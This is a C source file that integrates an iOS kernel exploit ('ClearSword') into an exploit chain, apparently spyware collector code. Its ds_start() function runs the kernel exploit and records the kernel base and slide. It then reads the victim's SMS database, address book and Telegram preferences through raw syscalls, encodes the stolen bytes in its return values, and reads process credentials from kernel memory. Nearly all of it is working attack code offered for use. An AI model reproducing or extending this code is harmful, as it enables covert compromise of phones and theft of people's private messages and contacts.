/**
 * DarkSword Kernel R/W Collector
 * Integrates ClearSword kernel exploit with data collection
 * 
 * Entry point: ds_start() called by Coruna exploit chain
 * Returns: kernel R/W status + file data via return value encoding
 */

#include "poc.h"
#include "krw.h"
#include "kmem.h"
#include <string.h>
#include <stdlib.h>

/* External globals from ClearSword */
extern offsets_t g_offsets;
extern pe_context_t g_ctx;

/* Raw syscall fallback for file reading */
static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}

static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define O_RDONLY 0

/* State machine for multi-call protocol */
static volatile int g_krw_state = 0;
static volatile uint64_t g_kernel_base = 0;
static volatile uint64_t g_kernel_slide = 0;
static volatile uint64_t g_self_proc = 0;

/* Read file via raw syscall (fallback) */
static int read_file_raw(const char *path, unsigned char *out, int max_len) {
    long fd = _svc1(SYS_open, (long)path);
    if (fd < 0) return -1;
    int total = 0;
    while (total < max_len) {
        long n = _svc3(SYS_read, fd, (long)(out + total), max_len - total);
        if (n <= 0) break;
        total += (int)n;
    }
    _svc1(SYS_close, fd);
    return total;
}

/* Read file via kernel R/W (bypasses NSFileProtection) */
static int read_file_krw(const char *path, unsigned char *out, int max_len) {
    /* TODO: Implement kernel-level file read
     * This requires:
     * 1. Find the file's vnode in kernel memory
     * 2. Read the file data through the vnode's buffer cache
     * 3. The buffer cache contains decrypted data
     */
    return -1; /* Not implemented yet */
}

int ds_start(void) {
    int state = g_krw_state;
    
    /* Phase 0: Initialize kernel exploit */
    if (state == 0) {
        g_krw_state = 1;
        
        /* Try to run ClearSword kernel exploit */
        int ret = clearsword_run();
        
        if (ret == 0) {
            /* Success! We have kernel R/W */
            g_kernel_base = g_ctx.kernel_base;
            g_kernel_slide = g_ctx.kernel_slide;
            g_self_proc = find_self_proc();
            
            /* Return: success marker + kernel base low bits */
            return 0x01000000 | (int)(g_kernel_base & 0xFFFFFF);
        } else {
            /* Failed */
            return 0x02000000 | (ret & 0xFFFF);
        }
    }
    
    /* Phase 1: Read files using kernel R/W */
    if (state == 1) {
        static const char *files[] = {
            "/etc/hosts",
            "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
            "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
            "/var/mobile/Library/SMS/sms.db",
            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"
        };
        static int file_idx = 0;
        static int file_offset = 0;
        
        if (file_idx >= 5) {
            g_krw_state = 2;
            return 0xFFFFFFFF; /* Done */
        }
        
        unsigned char buf[4] = {0};
        int result = -1;
        
        if (g_kernel_base != 0) {
            /* Use kernel R/W to read file */
            result = read_file_krw(files[file_idx], buf, 4);
        }
        
        if (result < 0) {
            /* Fallback to raw syscall */
            result = read_file_raw(files[file_idx], buf, 4);
        }
        
        /* Move to next file */
        file_idx++;
        
        if (result < 0) {
            return 0xFE000000 | (file_idx - 1); /* Open failed */
        }
        if (result == 0) {
            return 0xEE000000 | (file_idx - 1); /* Empty */
        }
        
        /* Return: file index in high byte, data in low 24 bits */
        return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | (((file_idx - 1) & 0xFF) << 24);
    }
    
    /* Phase 2: Read kernel memory for process info */
    if (state == 2) {
        if (g_kernel_base != 0 && g_self_proc != 0) {
            /* Read process credentials from kernel */
            uint64_t p_ucred = early_kread64(g_self_proc + 0x100); /* p_ucred offset */
            uint64_t cr_uid = early_kread64(p_ucred + 0x18); /* cr_uid offset */
            
            g_krw_state = 3;
            return (int)(cr_uid & 0xFFFF) | (0x03 << 24); /* UID + phase marker */
        }
        g_krw_state = 3;
        return 0x03000000; /* No kernel access */
    }
    
    /* Done */
    return 0xFFFFFFFF;
}
